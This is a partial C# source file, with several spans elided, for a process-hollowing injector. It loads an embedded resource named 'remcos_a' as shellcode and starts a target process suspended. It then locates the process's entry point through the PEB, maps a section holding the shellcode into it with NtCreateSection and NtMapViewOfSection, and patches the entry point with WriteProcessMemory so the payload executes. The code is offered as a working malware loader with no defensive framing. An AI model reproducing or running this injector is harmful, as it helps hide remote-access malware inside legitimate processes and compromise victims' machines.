...
namespace NewTestInjection
{
    class Program
    {
        ...
        static void Main(string[] args)
        {
            ...
            byte[] buf = NouveauTest.Properties.Resources.remcos_a;
            ...
            Console.WriteLine("[>] Process created in suspended mode.");
            Console.WriteLine("	| -> Name of the process: " + ProcName);
            Console.WriteLine("	| -> Process ID: " + pi.dwProcessId);
            Console.WriteLine("	| -> Thread ID: " + pi.dwThreadId);

            // Variables for process information
            // Process Handle
            ...
            // Get the process information to search for the PEB 
            ...
            Console.WriteLine("\n[>] Process Information " + ProcName + " obtained.");
            Console.WriteLine(" | -> PEB: 0x{0:X16}", pbi.PebBaseAddress.ToInt64());

            // Calculation of ImageBaseAddres value location
            IntPtr ptrImageBase = (IntPtr)((Int64)pbi.PebBaseAddress + 0x10);

            // Variables to store the value of ImageBaseAddress
            ...
            //Read 8 bytes of memory at the PEB location to get the address of the ImageBaseAddress
            ...
            // Get value of optional header
            // e_lfanew + 0x28
            uint opthdr = e_lfanew + 0x28;

            // Get value of entrypoint_rva
            uint entrypoint_rva = BitConverter.ToUInt32(dataPE, (int)opthdr);

            // Get the value of the AddressOfEntryPoint
            ...
            // Variables for section creation
            long MaxSize = buf.Length;

            // Pointer to section address
            IntPtr section = IntPtr.Zero;

            //Create a section
            UInt32 result = NtCreateSection(
                ref section,
            ...
            Console.WriteLine("\n[>] Section created.");
            Console.WriteLine(" | -> Section: 0x{0:X16}", section.ToInt64());

            //Section mapping

            // viewSize
            uint viewSize = (uint)buf.Length;

            // seccionOffset
            ulong sectionOffset = 0;

            //Pointer to local section
            IntPtr localSectionAddr = IntPtr.Zero;

            //Pointer to remote section address
            ...
            Console.WriteLine(" | -> Address of the Local Section : 0x{0:X16}", localSectionAddr.ToInt64());

            // Map section to remote process
            NtMapViewOfSection(
                section,
                pHandle, //Process to make Hollowing
                ref remoteSectionAddr,
                UIntPtr.Zero,
                UIntPtr.Zero,
                out sectionOffset,
                out viewSize,
            ...
            Console.WriteLine(" | -> Remote section address : 0x{0:X16}", remoteSectionAddr.ToInt64());

            // Shellcode Copy
            Marshal.Copy(buf, 0, localSectionAddr, buf.Length);
            Console.WriteLine("\n[>] Shellcode copied to the section.");

            //Modify the entryPoint to point to section
            KeyValuePair<int, IntPtr> path = BuildEntryPatch(remoteSectionAddr);

            IntPtr tPtr;

            WriteProcessMemory(pHandle, addressOfEntryPoint, path.Value, path.Key, out tPtr);
        ...
        public static KeyValuePair<int, IntPtr> BuildEntryPatch(IntPtr dest)
        {
            ...
            Console.WriteLine("\n[>] Instructions for shellcode execution: 0x{0:X16}", (ptr).ToInt64());
